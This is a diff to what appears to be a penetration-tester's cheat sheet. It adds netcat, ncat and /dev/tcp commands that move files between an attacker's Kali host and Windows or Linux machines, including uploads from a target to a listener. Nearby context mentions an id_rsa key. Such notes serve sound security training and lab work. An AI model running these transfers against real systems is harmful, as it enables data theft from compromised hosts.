@@ -782,15 +782,33 @@ $ md5sum id_rsa
 - Netcat Downloads (Kali -> Windows)
 
 ```
-$ nc -nlvp 443 < file.txt
+$ sudo nc -nlvp -q 0 443 < file.txt
 C:\> nc.exe -nv <IP address> 443 > file.txt
+
+$ sudo nc -nlvp 443 > file.txt
+C:\> nc.exe -q 0 <IP address> 443 < file.txt
+```
+
+- Ncat Downloads (Kali -> Linux)
+
+```
+$ sudo ncat -nlvp 443 --send-only < file.txt
+$ ncat <IP address> 443 --recv-only > file.txt
+OR
+$ cat < /dev/tcp/<IP address>/443 > file.txt
+
+$ sudo ncat -nlvp 443 --recv-only > file.txt
+$ ncat --send-only <IP address> 443 < file.txt
 ```
 
 - Netcat Uploads (Windows -> Kali)
 
 ```
-C:\> nc.exe -nlvp 443 < file.txt
+C:\> nc.exe -nlvp 443 -q 0 < file.txt
 $ nc -nv <IP address> 443 > file.txt
+
+C:\> nc.exe -nlvp 443 > file.txt
+$ nc -q 0 <IP address> 443 < file.txt
 ```
 
 - Python Web Uploads over HTTPS (Linux -> Kali)
